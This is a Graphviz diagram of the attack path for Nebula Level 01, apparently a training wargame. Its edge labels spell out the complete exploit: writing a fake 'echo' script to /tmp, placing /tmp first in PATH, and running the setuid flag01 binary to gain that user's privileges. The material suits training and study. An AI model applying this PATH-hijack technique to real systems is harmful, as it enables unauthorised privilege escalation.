digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 01"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Malicious echo prepared"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="PATH hijack environment prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag01 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="printf \"#!/bin/sh
/bin/getflag
\" > /tmp/echo && chmod +x /tmp/echo"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="export PATH=/tmp:$PATH"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="/home/flag01/flag01"];
}
